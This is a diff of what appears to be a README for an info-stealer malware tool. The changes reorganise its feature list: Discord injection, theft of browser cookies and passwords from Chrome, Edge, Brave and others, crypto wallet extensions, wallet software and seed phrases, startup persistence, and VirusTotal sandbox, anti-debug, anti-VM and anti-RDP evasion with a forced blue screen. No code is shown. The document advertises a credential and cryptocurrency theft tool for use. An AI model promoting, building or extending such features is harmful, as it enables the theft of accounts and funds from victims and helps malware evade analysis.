@@ -24,6 +24,10 @@
     -   HQ Guilds
     -   Gift Codes
 
+-   General Functions
+    -   Check if being run in a VirusTotal sandbox
+    -   Adds file to startup
+    -   Anti-Debug / Anti-VM / Anti-RDP / Blue Screen if detect
 
 
 -   Discord Injection
@@ -31,7 +35,10 @@
 
 
 
-- Grab Browser cookies & passwords
+-   Browser Data
+    -   Cookies
+    -   Passwords
+    -   From Chrome, Edge, Brave, Opera GX, and many more...
 
 
 -   General Functions
@@ -39,7 +46,10 @@
     -   Adds file to startup
 
 
-
+-   Crypto Data
+    -   Extensions (MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet and +40 wallets supported)
+    -   Softwares (Exodus, Atomic, Guarda, Electrum, Zcash, Armory, Binance, Coinomi)
+    -   Seedphrases and backup codes
 
 
 -   Application Data
@@ -62,12 +72,8 @@
 
 
 
--   General Functions
-    -   Check if being run in a VirusTotal sandbox
-    -   Adds file to startup
 
 
-- Grab Crypto Wallets. 🦊 Metamask, 🅰️ Atomic, 👾 Exodus, 🅱️ Binance, 💰 Coinbase, 🟡 Trust, 👻 Phantom ...
 
                                                       ⬇️ Setup
 
